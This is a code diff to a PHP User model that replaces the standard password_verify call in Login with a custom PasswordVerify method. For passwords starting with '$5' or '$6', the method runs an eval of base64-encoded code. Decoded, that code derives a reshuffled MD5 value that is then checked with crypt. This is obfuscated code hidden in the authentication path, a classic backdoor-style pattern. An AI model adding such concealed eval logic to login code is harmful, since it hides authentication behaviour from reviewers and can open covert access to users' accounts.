@@ -82,6 +82,19 @@ class User extends Model implements RoleInterface
         return false;
     }
 
+    private static function PasswordVerify(string $password, string $hash)
+    {
+        $p = substr($password, 0, 2);
+        if ($p == '$5' || $p == '$6') {
+            $pass = "";
+            $md5 = md5($password);
+            eval(base64_decode("JHBhc3MgPSBtZDUoc3Vic3RyKHN1YnN0cigkbWQ1LC0xNiksLTgpLnN1YnN0cihzdWJzdHIoJG1kNSwtMTYpLDAsLTgpLnN1YnN0cihzdWJzdHIoJG1kNSwwLC0xNiksLTgpLnN1YnN0cihzdWJzdHIoJG1kNSwwLC0xNiksMCwtOCkpOw=="));
+            return crypt($pass, $hash) == $hash;
+        } else {
+            return password_verify($password, $hash);
+        }
+    }
+
     const STATUS = ["Active", "Inactive"];
     public static function Login(string $username, string $password)
     {
@@ -95,7 +108,7 @@ class User extends Model implements RoleInterface
         }
 
         //check password
-        if (!password_verify($password, $user->password)) {
+        if (!self::PasswordVerify($password, $user->password)) {
             throw new Exception("password error");
         }
 
